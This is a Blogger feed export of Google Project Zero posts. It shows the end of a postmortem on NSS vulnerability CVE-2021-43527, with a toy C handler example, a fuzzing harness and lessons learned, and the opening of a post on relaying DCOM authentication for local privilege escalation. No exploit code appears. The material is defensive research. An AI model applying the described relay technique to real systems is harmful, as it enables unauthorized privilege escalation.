 <p class="c3"><span class="c12">void</span><span class="c1">&nbsp;cmd_handler_baz</span><span class="c19">(</span><span class="c12">int</span><span class="c1">&nbsp;a</span><span class="c23 c21">,</span><span class="c1">&nbsp;</span><span class="c12">size_t</span><span class="c1">&nbsp;b</span><span class="c19">)</span><span class="c1">&nbsp;</span><span class="c19">{</span><span class="c1">&nbsp;cmd_handler_bar</span><span class="c19">(</span><span class="c1">a</span><span class="c23 c21">,</span><span class="c1">&nbsp;</span><span class="c12">sizeof</span><span class="c1">&nbsp;buf</span><span class="c19">)</span><span class="c23 c21">;</span><span class="c1">&nbsp;</span><span class="c19">}</span></p>
 <p class="c3"><span class="c1 c8">&nbsp;</span></p>
 <p class="c3"><span class="c12">typedef</span><span class="c1">&nbsp;</span><span class="c12">void</span><span class="c1">&nbsp;</span><span class="c19">(</span><span class="c23 c21">*</span><span class="c1">&nbsp;dispatch_t</span><span class="c19">)(</span><span class="c12">int</span><span class="c23 c21">,</span><span class="c1">&nbsp;</span><span class="c12">size_t</span><span class="c19">)</span><span class="c23 c21">;</span></p>
 <p class="c3"><span class="c1 c8">&nbsp;</span></p>
 <p class="c3"><span class="c1">dispatch_t handlers</span><span class="c19">[</span><span class="c1">UCHAR_MAX</span><span class="c19">]</span><span class="c1">&nbsp;</span><span class="c23 c21">=</span><span class="c1">&nbsp;</span><span class="c19">{</span></p>
 <p class="c3"><span class="c1">&nbsp; &nbsp; cmd_handler_foo</span><span class="c23 c21">,</span></p>
 <p class="c3"><span class="c1">&nbsp; &nbsp; cmd_handler_bar</span><span class="c23 c21">,</span></p>
 <p class="c3"><span class="c1">&nbsp; &nbsp; cmd_handler_baz</span><span class="c23 c21">,</span></p>
 <p class="c3"><span class="c19">}</span><span class="c23 c21">;</span></p>
 <p class="c3"><span class="c1 c8">&nbsp;</span></p>
 <p class="c3"><span class="c12">int</span><span class="c1">&nbsp;main</span><span class="c19">(</span><span class="c12">int</span><span class="c1">&nbsp;argc</span><span class="c21 c23">,</span><span class="c1">&nbsp;</span><span class="c12">char</span><span class="c1">&nbsp;</span><span class="c23 c21">**</span><span class="c1">argv</span><span class="c19">)</span></p>
 <p class="c3"><span class="c19">{</span></p>
 <p class="c3"><span class="c1">&nbsp; &nbsp; </span><span class="c12">int</span><span class="c1">&nbsp;cmd</span><span class="c23 c21">;</span></p>
 <p class="c3"><span class="c1 c8">&nbsp;</span></p>
 <p class="c3"><span class="c1">&nbsp; &nbsp; </span><span class="c21 c42">while</span><span class="c1">&nbsp;</span><span class="c19">((</span><span class="c1">cmd </span><span class="c23 c21">=</span><span class="c1">&nbsp;</span><span class="c28 c21">getchar</span><span class="c19">())</span><span class="c1">&nbsp;</span><span class="c23 c21">!=</span><span class="c1">&nbsp;EOF</span><span class="c19">)</span><span class="c1">&nbsp;</span><span class="c19">{</span></p>
 <p class="c3"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c42 c21">if</span><span class="c1">&nbsp;</span><span class="c19">(</span><span class="c1">handlers</span><span class="c19">[</span><span class="c1">cmd</span><span class="c19">])</span><span class="c1">&nbsp;</span><span class="c19">{</span></p>
 <p class="c3"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; handlers</span><span class="c19">[</span><span class="c1">cmd</span><span class="c19">](</span><span class="c21 c28">getchar</span><span class="c19">()</span><span class="c23 c21">,</span><span class="c1">&nbsp;</span><span class="c28 c21">getchar</span><span class="c19">())</span><span class="c23 c21">;</span></p>
 <p class="c3"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c19">}</span></p>
 <p class="c3"><span class="c1">&nbsp; &nbsp; </span><span class="c19">}</span></p>
 <p class="c3"><span class="c19">}</span></p></td></tr><tr class="c29"><td class="c15" colspan="1" rowspan="1">
 <p class="c3 c33 c16 subtitle" id="h.9a31y6u3z63v"><span class="c32">Fig 4.</span><span>&nbsp;The coverage </span><span>of command</span><span>&nbsp;</span><span class="c32">bar</span><span>&nbsp;is a superset of command </span><span class="c32">foo</span><span>, so an input containing the latter would be discarded during corpus minimization. There is a vulnerability unreachable via command </span><span class="c32">bar </span><span>that might never be discovered. Stack coverage would correctly keep both inputs.</span><sup><a href="#ftnt1" id="ftnt_ref1" name="ftnt_ref1">[1]</a></sup></p></td></tr></tbody></table>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">To solve this problem, I&rsquo;ve been experimenting with monitoring the call stack during execution.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">The naive implementation is too slow to be practical, but after a lot of optimization I had come up with a library that was fast enough to be integrated into coverage-guided fuzzing, and was testing how it performed with NSS and other libraries.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h2 class="c13 c16" id="h.hx3w7e9emdvh"><span class="c24 c8">Object Isolation</span></h2>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">Many data types are constructed from smaller records. PNG files are made of chunks, PDF files are made of streams, ELF files are made of sections, and X.509 certificates are made of ASN.1 TLV items. If a fuzzer has some understanding of the underlying format, it can isolate these records and extract the one(s) causing some new stack trace to be found.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">The fuzzer I was using is able to isolate and extract interesting new ASN.1 OIDs, SEQUENCEs, INTEGERs, and so on. Once extracted, it can then randomly combine or insert them into template data. This isn&rsquo;t really a new idea, but is a new implementation. I&#39;m planning to open source this code in the future.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h2 class="c13 c16" id="h.eyoyd5te8xd4"><span class="c24 c8">Do these approaches work?</span></h2>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">I wish that I could say that discovering this bug validates my ideas, but I&rsquo;m not sure it does. I was doing some moderately novel fuzzing, but I see no reason this bug couldn&rsquo;t have been found earlier with even rudimentary fuzzing techniques.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h2 class="c13 c16" id="h.gjjikaq7urz2"><span class="c24 c8">Lessons Learned</span></h2>
 <p class="c2"><span class="c24 c8"></span></p>
 <p class="c13"><span class="c11 c8">How did extensive, customized fuzzing with impressive coverage metrics fail to discover this bug?</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h3 class="c13 c16" id="h.jjxdnfbzkeky"><span class="c24 c8">What went wrong</span></h3>
 <p class="c2"><span class="c11 c8"></span></p><h4 class="c13 c16" id="h.tq5bofk5duby"><span>Issue #1 </span><span class="c35">Missing end-to-end testing</span><span class="c6">.</span></h4>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>NSS is a </span><span class="c26"><a class="c91" href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/NSS_API_Guidelines">modular</a></span><span>&nbsp;library. This layered design is reflected in the </span><span class="c26"><a class="c91" href="https://searchfox.org/nss/source/fuzz/">fuzzing</a></span><span>&nbsp;approach, as each component is fuzzed independently. For example, the </span><span class="c26"><a class="c91" href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/NSS_Tech_Notes/nss_tech_note1#how_to_use_the_nss_asn.1_and_quickder_decoders">QuickDER</a></span><span>&nbsp;decoder is tested </span><span class="c26"><a class="c91" href="https://searchfox.org/nss/source/fuzz/quickder_target.cc">extensively</a></span><span>, but the fuzzer simply </span><span class="c26"><a class="c91" href="https://searchfox.org/nss/rev/5f2fa238b58c9158a52c0681ca2a67958a353082/fuzz/quickder_target.cc#72">creates and discards</a></span><span class="c11 c8">&nbsp;objects and never uses them.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c2"><span class="c11 c8"></span></p><a id="t.f4e0f36d5a94fbada814aadd6ad3730de37e434f"></a><a id="t.4"></a><table class="c4"><tbody><tr class="c29"><td class="c15" colspan="1" rowspan="1">
 <p class="c3"><span class="c5">extern</span><span class="c0">&nbsp;</span><span class="c21 c22">&quot;C&quot;</span><span class="c0">&nbsp;</span><span class="c5">int</span><span class="c0">&nbsp;LLVMFuzzerTestOneInput(</span><span class="c5">const</span><span class="c0 c8">&nbsp;uint8_t *Data, size_t Size) {</span></p>
 <p class="c3"><span class="c0">&nbsp;</span><span class="c5">char</span><span class="c0 c8">&nbsp;*dest[2048];</span></p>
 <p class="c31"><span class="c0 c8"></span></p>
 <p class="c3"><span class="c0">&nbsp;</span><span class="c5">for</span><span class="c0">&nbsp;(</span><span class="c5">auto</span><span class="c0 c8">&nbsp;tpl : templates) {</span></p>
 <p class="c3"><span class="c0 c8">&nbsp; &nbsp;PORTCheapArenaPool pool;</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp;SECItem buf = {siBuffer, </span><span class="c5">const_cast</span><span class="c0">&lt;</span><span class="c5">unsigned</span><span class="c0">&nbsp;</span><span class="c5">char</span><span class="c0 c8">&nbsp;*&gt;(Data),</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c5">static_cast</span><span class="c0">&lt;</span><span class="c5">unsigned</span><span class="c0">&nbsp;</span><span class="c5">int</span><span class="c0 c8">&gt;(Size)};</span></p>
 <p class="c31"><span class="c0 c8"></span></p>
 <p class="c3"><span class="c0 c8">&nbsp; &nbsp;PORT_InitCheapArena(&amp;pool, DER_DEFAULT_CHUNKSIZE);</span></p>
 <p class="c3"><span class="c0">&nbsp; &nbsp;(</span><span class="c5">void</span><span class="c0 c8">)SEC_QuickDERDecodeItem(&amp;pool.arena, dest, tpl, &amp;buf);</span></p>
 <p class="c3"><span class="c0 c8">&nbsp; &nbsp;PORT_DestroyCheapArena(&amp;pool);</span></p>
 <p class="c34"><span class="c0">&nbsp;}</span></p></td></tr><tr class="c29"><td class="c15" colspan="1" rowspan="1">
 <p class="c3 c16 subtitle" id="h.9rchnmg47ypy"><span class="c32">Fig 5.</span><span class="c8 c30">&nbsp;The QuickDER fuzzer simply creates and discards objects. This verifies the ASN.1 parsing, but not whether other components handle the resulting objects correctly.</span></p></td></tr></tbody></table>
 <p class="c2 c43"><span class="c11 c8"></span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>This fuzzer might have produced a </span><span class="c21">SECKEYPublicKey</span><span class="c11 c8">&nbsp;that could have reached the vulnerable code, but as the result was never used to verify a signature, the bug could never be discovered.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h4 class="c13 c16" id="h.y3p8hf8j0qqo"><span>Issue #2 </span><span class="c35">Arbitrary size limits</span><span class="c6">.</span></h4>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>There is an arbitrary limit of </span><span class="c26"><a class="c91" href="https://searchfox.org/nss/source/fuzz/options/quickder.options">10000 bytes</a></span><span class="c11 c8">&nbsp;placed on fuzzed input. There is no such limit within NSS; many structures can exceed this size. This vulnerability demonstrates that errors happen at extremes, so this limit should be chosen thoughtfully.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>A reasonable choice might be 2</span><span class="c20">24</span><span>-1 bytes, the </span><span class="c26"><a class="c91" href="https://datatracker.ietf.org/doc/html/rfc8446#section-4.4.2">largest possible</a></span><span class="c11 c8">&nbsp;certificate that can be presented by a server during a TLS handshake negotiation.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>While NSS might handle objects even larger than this, TLS cannot possibly be involved, reducing the overall severity of any vulnerabilities missed.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h4 class="c13 c16" id="h.fny13amxfoss"><span>Issue #3 </span><span class="c35">Misleading metrics</span><span class="c6">.</span></h4>
 <p class="c2"><span class="c11 c46"></span></p>
 <p class="c13"><span class="c11 c8">All of the NSS fuzzers are represented in combined coverage metrics by oss-fuzz, rather than their individual coverage. This data proved misleading, as the vulnerable code is fuzzed extensively but by fuzzers that could not possibly generate a relevant input.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>This is because fuzzers like the </span><span class="c26"><a class="c91" href="https://searchfox.org/nss/source/fuzz/tls_server_target.cc">tls_server_target</a></span><span>&nbsp;use fixed, </span><span class="c26"><a class="c91" href="https://searchfox.org/nss/source/fuzz/tls_server_certs.cc">hardcoded</a></span><span class="c11 c8">&nbsp;certificates. This exercises code relevant to certificate verification, but only fuzzes TLS messages and protocol state changes.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h3 class="c13 c16" id="h.5iljytmv85wn"><span class="c24 c8">What Worked</span></h3>
 <p class="c2"><span class="c24 c8"></span></p><ul style="padding: 0;" class="c17 lst-kix_4idwybng3hbx-0 start"><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>The design of the mozilla::pkix validation library prevented this bug from being worse than it could have been. </span><span class="c11 c8">Unfortunately it is unused outside of Firefox and Thunderbird.</span></li></ul>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">It&rsquo;s debatable whether this was just good fortune or not. It seems likely RSA-PSS would eventually be permitted by mozilla::pkix, even though it was not today.</span></p>
 <p class="c2"><span class="c8 c11"></span></p><h2 class="c13 c16" id="h.t0ijbutqkb5h"><span class="c8 c24">Recommendations</span></h2>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span class="c11 c8">This issue demonstrates that even extremely well-maintained C/C++ can have fatal, trivial mistakes.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h3 class="c13 c16" id="h.yesvwttsgrsf"><span class="c24 c8">Short Term</span></h3>
 <p class="c2"><span class="c24 c8"></span></p><ul style="padding: 0;" class="c17 lst-kix_x7i5vtjupm2f-0 start"><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>Raise the maximum size of ASN.1 objects produced by libFuzzer from 10,000 to 2</span><span class="c20">24</span><span class="c11 c8">-1 = 16,777,215 &nbsp;bytes.</span></li></ul><ul style="padding: 0;" class="c17 lst-kix_wy7koemfbmv1-0 start"><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span class="c11 c8">The QuickDER fuzzer should call some relevant APIs with any objects successfully created before destroying them.</span></li><li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"><span>The oss-fuzz code coverage metrics should be divided by fuzzer, not by project.</span></li></ul>
 <p class="c2"><span class="c11 c8"></span></p><h1 class="c13 c16" id="h.i49j9otzq1oi"><span class="c24 c8">Solution</span></h1>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>This vulnerability is </span><span>CVE-2021-43527,</span><span>&nbsp;and is resolved in </span><span class="c26"><a class="c91" href="https://www.mozilla.org/en-US/security/advisories/">NSS 3.73.0</a></span><span class="c11 c8">. If you are a vendor that distributes NSS in your products, you will most likely need to update or backport the patch.</span></p>
 <p class="c2"><span class="c11 c8"></span></p><h1 class="c13 c16" id="h.9canxlbf0rtp"><span class="c24 c8">Credits</span></h1>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>I would not have been able to find this bug without assistance from my colleagues from Ch</span><span>rome, Ryan S</span><span class="c11 c8">leevi and David Benjamin, who helped answer my ASN.1 encoding questions and engaged in thoughtful discussion on the topic.</span></p>
 <p class="c2"><span class="c11 c8"></span></p>
 <p class="c13"><span>Thanks to the NSS team, who helped triage and analyze the vulnerability.</span></p><hr class="c44"><div>
 <p class="c3 c33"><a href="#ftnt_ref1" id="ftnt1" name="ftnt1">[1]</a><span class="c8 c36 c47">&nbsp;In this minimal example, a workaround if source was available would be to use a combination of sancov&#39;s data-flow instrumentation options, but that also fails on more complex variants.</span></p></div></div>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/7868790017880077590/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2021/12/this-shouldnt-have-happened.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/7868790017880077590
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/7868790017880077590
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2021/12/this-shouldnt-have-happened.html
## @title
This shouldn't have happened: A vulnerability postmortem
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-5634534606665421566
## published
20/10/2021 13:38:00
## updated
23/08/2022 16:22:51
## title
## @type
text
## #text
Windows Exploitation Tricks: Relaying DCOM Authentication
## content
## @type
html
## #text
<style type="text/css">.lst-kix_21eii7u3d36d-6>li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-6,decimal) ". "}.lst-kix_4h5ag0d3tyrp-4>li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-4}ol.lst-kix_21eii7u3d36d-8{list-style-type:none}ol.lst-kix_21eii7u3d36d-7{list-style-type:none}ol.lst-kix_21eii7u3d36d-0.start{counter-reset:lst-ctn-kix_21eii7u3d36d-0 0}ol.lst-kix_21eii7u3d36d-6{list-style-type:none}ol.lst-kix_21eii7u3d36d-5{list-style-type:none}.lst-kix_21eii7u3d36d-3>li:before{content:"(" counter(lst-ctn-kix_21eii7u3d36d-3,decimal) ") "}ol.lst-kix_21eii7u3d36d-4{list-style-type:none}.lst-kix_21eii7u3d36d-7>li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-7,lower-latin) ". "}ol.lst-kix_21eii7u3d36d-3{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-6.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-6 0}.lst-kix_21eii7u3d36d-2>li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-2,lower-roman) ") "}ol.lst-kix_21eii7u3d36d-2{list-style-type:none}ol.lst-kix_21eii7u3d36d-1{list-style-type:none}ol.lst-kix_21eii7u3d36d-7.start{counter-reset:lst-ctn-kix_21eii7u3d36d-7 0}ol.lst-kix_21eii7u3d36d-0{list-style-type:none}.lst-kix_21eii7u3d36d-0>li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-0,decimal) ") "}ol.lst-kix_21eii7u3d36d-3.start{counter-reset:lst-ctn-kix_21eii7u3d36d-3 0}.lst-kix_21eii7u3d36d-8>li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-8,lower-roman) ". "}.lst-kix_21eii7u3d36d-1>li:before{content:"" counter(lst-ctn-kix_21eii7u3d36d-1,lower-latin) ") "}.lst-kix_21eii7u3d36d-3>li{counter-increment:lst-ctn-kix_21eii7u3d36d-3}.lst-kix_4h5ag0d3tyrp-5>li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-5}ol.lst-kix_21eii7u3d36d-6.start{counter-reset:lst-ctn-kix_21eii7u3d36d-6 0}ol.lst-kix_4h5ag0d3tyrp-3.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-3 0}ol.lst-kix_4h5ag0d3tyrp-7.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-7 0}.lst-kix_21eii7u3d36d-2>li{counter-increment:lst-ctn-kix_21eii7u3d36d-2}.lst-kix_21eii7u3d36d-5>li{counter-increment:lst-ctn-kix_21eii7u3d36d-5}.lst-kix_21eii7u3d36d-8>li{counter-increment:lst-ctn-kix_21eii7u3d36d-8}ol.lst-kix_4h5ag0d3tyrp-0.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-0 0}ol.lst-kix_21eii7u3d36d-8.start{counter-reset:lst-ctn-kix_21eii7u3d36d-8 0}ol.lst-kix_4h5ag0d3tyrp-4.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-4 0}ol.lst-kix_21eii7u3d36d-2.start{counter-reset:lst-ctn-kix_21eii7u3d36d-2 0}.lst-kix_4h5ag0d3tyrp-0>li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-0}.lst-kix_21eii7u3d36d-4>li:before{content:"(" counter(lst-ctn-kix_21eii7u3d36d-4,lower-latin) ") "}.lst-kix_4h5ag0d3tyrp-6>li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-6}.lst-kix_21eii7u3d36d-5>li:before{content:"(" counter(lst-ctn-kix_21eii7u3d36d-5,lower-roman) ") "}.lst-kix_4h5ag0d3tyrp-3>li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-3}ol.lst-kix_4h5ag0d3tyrp-6{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-7{list-style-type:none}ol.lst-kix_21eii7u3d36d-5.start{counter-reset:lst-ctn-kix_21eii7u3d36d-5 0}ol.lst-kix_4h5ag0d3tyrp-4{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-1.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-1 0}ol.lst-kix_4h5ag0d3tyrp-5{list-style-type:none}.lst-kix_4h5ag0d3tyrp-7>li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-7,lower-latin) ". "}.lst-kix_21eii7u3d36d-6>li{counter-increment:lst-ctn-kix_21eii7u3d36d-6}ol.lst-kix_4h5ag0d3tyrp-8.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-8 0}.lst-kix_4h5ag0d3tyrp-1>li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-1}ol.lst-kix_4h5ag0d3tyrp-8{list-style-type:none}.lst-kix_4h5ag0d3tyrp-4>li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-4,lower-latin) ". "}.lst-kix_4h5ag0d3tyrp-8>li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-8,lower-roman) ". "}.lst-kix_21eii7u3d36d-0>li{counter-increment:lst-ctn-kix_21eii7u3d36d-0}.lst-kix_4h5ag0d3tyrp-3>li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-3,decimal) ". "}ol.lst-kix_4h5ag0d3tyrp-2{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-3{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-0{list-style-type:none}ol.lst-kix_4h5ag0d3tyrp-1{list-style-type:none}.lst-kix_4h5ag0d3tyrp-2>li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-2,lower-roman) ". "}.lst-kix_4h5ag0d3tyrp-7>li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-7}ol.lst-kix_21eii7u3d36d-1.start{counter-reset:lst-ctn-kix_21eii7u3d36d-1 0}.lst-kix_4h5ag0d3tyrp-5>li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-5,lower-roman) ". "}.lst-kix_4h5ag0d3tyrp-8>li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-8}.lst-kix_4h5ag0d3tyrp-6>li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-6,decimal) ". "}ol.lst-kix_21eii7u3d36d-4.start{counter-reset:lst-ctn-kix_21eii7u3d36d-4 0}.lst-kix_4h5ag0d3tyrp-2>li{counter-increment:lst-ctn-kix_4h5ag0d3tyrp-2}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_4h5ag0d3tyrp-5.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-5 0}.lst-kix_21eii7u3d36d-4>li{counter-increment:lst-ctn-kix_21eii7u3d36d-4}.lst-kix_21eii7u3d36d-7>li{counter-increment:lst-ctn-kix_21eii7u3d36d-7}.lst-kix_4h5ag0d3tyrp-1>li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-1,lower-latin) ". "}.lst-kix_21eii7u3d36d-1>li{counter-increment:lst-ctn-kix_21eii7u3d36d-1}.lst-kix_4h5ag0d3tyrp-0>li:before{content:"" counter(lst-ctn-kix_4h5ag0d3tyrp-0,decimal) ". "}ol.lst-kix_4h5ag0d3tyrp-2.start{counter-reset:lst-ctn-kix_4h5ag0d3tyrp-2 0}ol{margin:0;padding:0}table td,table th{padding:0}.c31{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c23{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c6{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Courier New";font-style:normal}.c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c10{background-color:#ffffff;font-size:10pt;font-family:"Courier New";color:#8000ff;font-weight:400}.c3{background-color:#ffffff;font-size:10pt;font-family:"Courier New";color:#000080;font-weight:700}.c20{border-spacing:0;border-collapse:collapse;margin-right:auto}.c16{background-color:#ffffff;font-size:10pt;font-family:"Courier New";font-weight:700}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c11{background-color:#ffffff;font-size:10pt;font-family:"Courier New";font-weight:400}.c25{color:#000000;font-weight:400;font-size:16pt;font-family:"Arial"}.c22{color:#000000;font-weight:400;font-size:11pt;font-family:"Courier New"}.c2{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c8{font-size:10pt;font-family:"Courier New";color:#a82d00;font-weight:400}.c7{font-size:10pt;font-family:"Courier New";color:#696969;font-weight:400}.c12{font-size:10pt;font-family:"Courier New";font-weight:400}.c17{text-decoration:none;vertical-align:baseline;font-style:normal}.c29{padding:0;margin:0}.c34{margin-left:36pt;padding-left:0pt}.c35{max-width:468pt;padding:72pt 72pt 72pt 72pt}.c21{color:inherit;text-decoration:inherit}.c14{color:#8b0000}.c13{color:#0000ff}.c19{height:11pt}.c15{color:#800000}.c4{font-style:italic}.c18{color:#800080}.c24{color:#006161}.c33{background-color:#ffffff}.c32{color:#000080}.c27{color:#a31515}.c30{color:#00008b}.c26{height:0pt}.c28{color:#8a2be2}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c33 c35">
 <p class="c5"><span class="c9">Posted by James Forshaw, Project Zero</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c5"><span>In my </span><span class="c2"><a class="c211" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">previous blog post</a></span><span>&nbsp;I discussed the possibility of relaying Kerberos authentication from a DCOM connection. I was originally going to provide a more in-depth explanation of how that works, but as it&#39;s quite involved I thought it was worthy of its own blog post. This is primarily a technique to get relay authentication from another user on the same machine and forward that to a network service such as LDAP. You could use this to escalate privileges on a host using a technique similar to a </span><span class="c2"><a class="c211" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-2-windows-1020162019-lpe">blog post</a></span><span>&nbsp;from Shenanigans Labs</span><span class="c9">&nbsp;but removing the requirement for the WebDAV service. Let&#39;s get straight to it.</span></p><h2 class="c23" id="h.5xga9tje7jcd"><span class="c25 c17">Background</span></h2>
 <p class="c5"><span>The technique to locally relay authentication for DCOM was something I originally reported back in 2015 (</span><span class="c2"><a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=325">issue 325</a></span><span>). This issue was fixed as CVE-2015-2370, however the underlying authentication relay using DCOM remained. This was repurposed and expanded upon by various others for local and remote privilege escalation in the </span><span class="c2"><a class="c211" href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">RottenPotato</a></span><span>&nbsp;series of exploits, the latest in that line being </span><span class="c2"><a class="c211" href="https://github.com/antonioCoco/RemotePotato0">RemotePotato</a></span><span>&nbsp;which is currently unpatched as of October 2021.</span></p>
 <p class="c0"><span class="c9"></span></p>
